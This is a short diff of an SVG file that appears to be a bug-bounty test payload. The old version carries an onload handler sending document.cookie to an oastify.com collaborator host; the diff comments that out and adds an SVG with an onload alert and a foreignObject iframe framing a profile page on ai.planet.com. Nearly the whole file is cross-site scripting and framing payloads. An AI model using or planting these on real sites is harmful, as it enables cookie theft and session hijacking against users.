@@ -1,3 +1,11 @@
-<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('https://vhgkbwniokbfy8qyl2ohjmjfu60xorcg.oastify.com/xss?executed=true&domain='+document.cookie)">
+<!-- <svg xmlns="http://www.w3.org/2000/svg" onload="fetch('https://vhgkbwniokbfy8qyl2ohjmjfu60xorcg.oastify.com/xss?executed=true&domain='+document.cookie)">
   <rect width="100" height="100" fill="red"/>
+</svg> -->
+
+<svg xmlns="http://www.w3.org/2000/svg" width="800" height="600" onload="alert('SVG loaded')">
+  <foreignObject width="100%" height="100%">
+    <div xmlns="http://www.w3.org/1999/xhtml">
+      <iframe src="https://ai.planet.com/profile" width="100%" height="100%"></iframe>
+    </div>
+  </foreignObject>
 </svg>
